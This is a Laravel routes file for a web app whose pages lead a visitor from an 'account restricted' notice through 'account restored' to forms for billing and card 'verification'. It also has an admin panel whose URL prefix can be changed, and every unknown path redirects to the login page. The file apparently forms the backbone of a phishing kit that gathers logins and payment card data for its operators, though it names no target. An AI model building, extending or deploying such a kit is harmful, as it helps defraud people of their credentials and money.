<?php

use App\Http\Controllers\{AdminController,
    AuthController,
    BillingController,
    CardController,
    DashboardController,
    RestoreController};
use App\Http\Middleware\AuthMid;
use App\Http\Middleware\GuestMid;
use App\Models\Settings;
use Illuminate\Support\Facades\Route;

Route::get('/login', AuthController::class)->name('login.index')->middleware(GuestMid::class);
Route::post('/login', [AuthController::class, 'post'])->name('login.store')->middleware(GuestMid::class);
Route::put('/login', [AuthController::class, 'put'])->name('login.authenticate')->middleware(GuestMid::class);


Route::get('/account/restricted', DashboardController::class)->name('dashboard')->middleware(AuthMid::class);

Route::get('/account/restored', [RestoreController::class, 'index'])->name('restored.index')->middleware(AuthMid::class);
Route::post('/account/restored', [RestoreController::class, 'store'])->name('restored.store')->middleware(AuthMid::class);

Route::get('/account/verify/billing', [BillingController::class, 'index'])->name('billing.index')->middleware(AuthMid::class);
Route::post('/account/verify/billing', [BillingController::class, 'store'])->name('billing.store')->middleware(AuthMid::class);

Route::get('/account/verify/card', [CardController::class, 'index'])->name('card.index')->middleware(AuthMid::class);
Route::post('/account/verify/card', [CardController::class, 'store'])->name('card.store')->middleware(AuthMid::class);


$adminPrefix = 'admin';
try {
    if (Schema::hasTable('settings') && !app()->runningInConsole()) {
        $adminPrefix = Settings::me()->admin_panel ?? 'admin';
    }
} catch (Throwable) {
}

Route::group(['as' => 'admin.', 'prefix' => $adminPrefix], static function () {
    Route::group(['middleware' => 'guest'], static function () {
        Route::get('/login', [AdminController::class, 'login_index'])->name('login');
        Route::post('/login', [AdminController::class, 'login_post'])->name('login.store');
    });

    Route::group(['middleware' => 'auth'], static function () {
        Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
        Route::patch('/update-settings', [AdminController::class, 'settings_patch'])->name('settings.patch');
        Route::get('/logout', [AdminController::class, 'logout'])->name('logout');
    });
});

Route::fallback(static function () {
    return redirect()->route('login.index');
});
